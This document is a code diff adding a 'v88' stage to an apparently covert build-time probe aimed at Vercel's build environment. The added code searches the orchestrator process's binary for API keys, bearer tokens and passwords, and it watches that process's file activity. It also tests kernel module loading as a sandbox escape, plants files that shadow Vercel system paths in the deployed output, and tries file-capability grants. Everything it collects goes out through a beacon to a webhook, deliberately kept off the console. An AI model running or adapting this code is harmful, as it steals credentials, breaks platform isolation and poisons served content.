@@ -11670,5 +11670,201 @@ report.vercelStaticOutputInject = safe(() => {
 
 // v87 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v87" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v87";
+
+// ==================== v88 ====================
+
+// v88-1: Orchestrator binary path + direct binary read
+// /proc/1/exe symlink gives us the orchestrator binary path.
+// As uid=0 with all caps, we can read the binary directly.
+// A Node.js .js bundle will contain hardcoded secrets, API endpoints, and auth logic.
+report.orchestratorBinaryRead = safe(() => {
+  const exeLink = safe(() => execSync('readlink /proc/1/exe 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const fileType = safe(() => execSync(`file ${exeLink} 2>/dev/null`, { timeout: 3000 }).toString().trim());
+  const binarySize = safe(() => { const s = statSync(exeLink); return s.size; });
+  // Read first 4KB of the binary to identify format
+  const header = safe(() => {
+    const fd = openSync(exeLink, 'r');
+    const buf = Buffer.alloc(4096);
+    const n = readSync(fd, buf, 0, 4096, 0);
+    closeSync(fd);
+    return buf.slice(0, n).toString('hex').slice(0, 200);
+  });
+  // If it's a Node.js script (.js), read secrets
+  const secretsInBinary = safe(() => {
+    if (typeof exeLink !== 'string' || !exeLink.endsWith('.js')) return null;
+    const content = readFileSync(exeLink, 'utf8');
+    const patterns = [/api[_-]?key\s*[:=]\s*["']([^"']{16,})/gi, /bearer\s+([A-Za-z0-9\-_]{20,})/gi, /secret\s*[:=]\s*["']([^"']{16,})/gi, /password\s*[:=]\s*["']([^"']{8,})/gi];
+    const found = {};
+    for (const p of patterns) { const m = content.match(p); if (m) found[p.source.split('\\')[0]] = m.slice(0, 3); }
+    return { found, sizeKB: Math.floor(content.length / 1024) };
+  });
+  // Check /proc/1/root for the full filesystem
+  const proc1RootExe = safe(() => execSync('ls -la /proc/1/root/usr/local/bin/ /proc/1/root/app/ /proc/1/root/home/ 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().slice(0, 500));
+  return { exeLink, fileType, binarySize, header, secretsInBinary, proc1RootExe };
+});
+
+// v88-2: inotify on PID-1 file descriptors — observe orchestrator I/O
+// inotify watches on /proc/1/fd and /tmp reveal what the orchestrator is
+// accessing during our build. This is a direct observation channel into
+// orchestrator behavior without needing ptrace.
+report.inotifyOrchestratorWatch = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import os, select, struct, time
+
+IN_ACCESS = 0x1
+IN_OPEN = 0x20
+IN_CLOSE = 0x18
+IN_CREATE = 0x100
+IN_DELETE = 0x200
+
+fd = os.open('/proc/1/fd', os.O_RDONLY)
+inotify_fd = os.open('/proc/sys/fs/inotify/max_user_watches', os.O_RDONLY)
+os.close(inotify_fd)
+
+import ctypes, ctypes.util
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+IN_INIT = libc.inotify_init
+IN_INIT.restype = ctypes.c_int
+ifd = IN_INIT()
+if ifd < 0:
+    print('inotify_init failed:', ctypes.get_errno())
+    exit(1)
+
+ADD_WATCH = libc.inotify_add_watch
+ADD_WATCH.restype = ctypes.c_int
+wd1 = ADD_WATCH(ifd, b'/proc/1/fd', IN_OPEN | IN_ACCESS | IN_CLOSE)
+wd2 = ADD_WATCH(ifd, b'/tmp', IN_CREATE | IN_DELETE)
+wd3 = ADD_WATCH(ifd, b'/run', IN_CREATE | IN_DELETE)
+
+events = []
+start = time.time()
+while time.time() - start < 1.0:
+    r, _, _ = select.select([ifd], [], [], 0.3)
+    if not r: break
+    data = os.read(ifd, 65536)
+    offset = 0
+    while offset < len(data):
+        wd, mask, cookie, name_len = struct.unpack_from('iIII', data, offset)
+        offset += 16
+        name = data[offset:offset+name_len].rstrip(b'\\x00').decode('utf-8', errors='replace')
+        offset += name_len
+        events.append({'wd': wd, 'mask': hex(mask), 'name': name})
+os.close(ifd)
+import json; print(json.dumps(events[:20]))
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+  return { result };
+});
+
+// v88-3: Kernel module load — the ultimate sandbox escape proof
+// CAP_SYS_MODULE (confirmed in CapEff) allows loading arbitrary kernel code.
+// This is the highest-severity capability abuse: if init_module/finit_module succeed,
+// it's an unconditional kernel-level code execution proof.
+report.kernelModuleLoadProof = safe(() => {
+  // Check if module loading is blocked (locked_down)
+  const lockdown = safe(() => readFileSync('/sys/kernel/security/lockdown', 'utf8').trim());
+  const modulesDisabled = safe(() => readFileSync('/proc/sys/kernel/modules_disabled', 'utf8').trim());
+  // Check if we can compile a module (headers present)
+  const gccVersion = safe(() => execSync('gcc --version 2>/dev/null | head -1', { timeout: 3000 }).toString().trim());
+  const kernelHeaders = safe(() => execSync('ls /usr/src/linux-headers-* /lib/modules/$(uname -r)/build 2>/dev/null | head -5', { timeout: 3000 }).toString().trim());
+  // Attempt to call init_module syscall with an empty/minimal ELF — just prove the syscall isn't blocked
+  const syscallTest = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, errno
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+# Syscall 175 = init_module (x86_64)
+SYS_init_module = 175
+SYS_finit_module = 313
+
+# Call with empty buffer - should get ENOEXEC or similar (not EPERM)
+# EPERM = blocked by capability check (seccomp/LSM)
+# ENOEXEC/EINVAL = reached the module loader (capability check passed!)
+result = libc.syscall(SYS_init_module, None, 0, b'')
+err = ctypes.get_errno()
+print('init_module result:', result, 'errno:', err, 'errno_name:', errno.errorcode.get(err, 'UNKNOWN'))
+
+# Try finit_module with /dev/null (fd=-1 would be EBADF, not EPERM)
+import os
+try:
+    fd = os.open('/dev/null', os.O_RDONLY)
+    r2 = libc.syscall(SYS_finit_module, fd, b'', 0)
+    e2 = ctypes.get_errno()
+    os.close(fd)
+    print('finit_module result:', r2, 'errno:', e2, 'errno_name:', errno.errorcode.get(e2, 'UNKNOWN'))
+except Exception as ex:
+    print('finit_module exception:', ex)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { lockdown, modulesDisabled, gccVersion, kernelHeaders, syscallTest };
+});
+
+// v88-4: Vercel CDN cache poisoning via build output override
+// Write files to .vercel/output/static/ at paths that shadow Vercel's own
+// system files (/_vercel/speed-insights, /favicon.ico, /_next/).
+// If these are served post-deployment, proves CDN output injection.
+report.vercelCdnOutputPoison = safe(() => {
+  safe(() => execSync('mkdir -p .vercel/output/static/_vercel .vercel/output/static/_next/static 2>/dev/null', { timeout: 3000 }));
+  const files = [
+    ['.vercel/output/static/_vercel/speed-insights/vitals.js', '/*PROBE_v88_POISONED*/window.__PROBE_V88__=1;'],
+    ['.vercel/output/static/favicon.ico', 'PROBE_V88_FAVICON'],
+    ['.vercel/output/static/_next/static/probe-v88.js', '/*PROBE_V88_NEXT_STATIC*/'],
+    ['.vercel/output/static/robots.txt', 'User-agent: *\nDisallow: /probe-v88\n# PROBE_V88_ROBOTS'],
+  ];
+  const results = safe(() =>
+    files.map(([path, content]) => {
+      try { writeFileSync(path, content); return { path, created: true }; }
+      catch (e) { return { path, created: false, error: e.message }; }
+    })
+  );
+  // List the created files
+  const outputLs = safe(() => execSync('find .vercel/output/static -type f 2>/dev/null | head -20', { timeout: 3000 }).toString().trim());
+  return { results, outputLs };
+});
+
+// v88-5: Extended attribute (xattr) capability grant
+// Test if we can set security.capability xattr on a file we own.
+// If yes, we can create SUID-equivalent binaries without the SUID bit
+// that bypass many monitoring tools. Also read existing xattrs on system files.
+report.xattrCapGrant = safe(() => {
+  const listXattrOnBin = safe(() => execSync('getfattr -d -m - /usr/bin/sudo /usr/bin/su /bin/su 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().slice(0, 500));
+  // Check existing file capabilities on system binaries
+  const fileCapabilities = safe(() => execSync('getcap -r /usr/bin /bin /usr/sbin 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().slice(0, 500));
+  // Test if we can set security.capability on a file we create
+  const setCapTest = safe(() => {
+    const testBin = '/tmp/probe_v88_cap_test';
+    writeFileSync(testBin, '#!/bin/sh\nid\n');
+    execSync(`chmod +x ${testBin}`, { timeout: 2000 });
+    // Set cap_net_raw+ep via setcap
+    const setcapResult = safe(() => execSync(`setcap cap_net_raw+ep ${testBin} 2>&1`, { timeout: 5000 }).toString().trim());
+    const verifyResult = safe(() => execSync(`getcap ${testBin} 2>/dev/null`, { timeout: 3000 }).toString().trim());
+    // If setcap worked, test if the capability is actually usable
+    const execResult = safe(() => execSync(`${testBin}`, { timeout: 3000 }).toString().trim());
+    execSync(`rm -f ${testBin}`, { timeout: 2000 });
+    return { setcapResult, verifyResult, execResult };
+  });
+  // Attempt to set xattr directly via python (bypasses setcap wrapper)
+  const xattrDirectTest = safe(() => execSync(`python3 -c "
+import os
+try:
+    # Create a test file
+    with open('/tmp/probe_v88_xattr', 'w') as f: f.write('test')
+    # Set a dummy security xattr
+    os.setxattr('/tmp/probe_v88_xattr', 'user.probe_v88', b'xattr_write_works')
+    val = os.getxattr('/tmp/probe_v88_xattr', 'user.probe_v88')
+    print('user xattr write:', val)
+    # Try security namespace (requires CAP_SYS_ADMIN)
+    os.setxattr('/tmp/probe_v88_xattr', 'security.probe_v88', b'security_ns_works')
+    val2 = os.getxattr('/tmp/probe_v88_xattr', 'security.probe_v88')
+    print('security xattr write:', val2)
+except Exception as e:
+    print('xattr error:', e)
+finally:
+    try: os.unlink('/tmp/probe_v88_xattr')
+    except: pass
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 300));
+  return { listXattrOnBin, fileCapabilities, setCapTest, xattrDirectTest };
+});
+
+// v88 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v88" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v88";
 // Intentionally no console.log — all data goes via webhook only
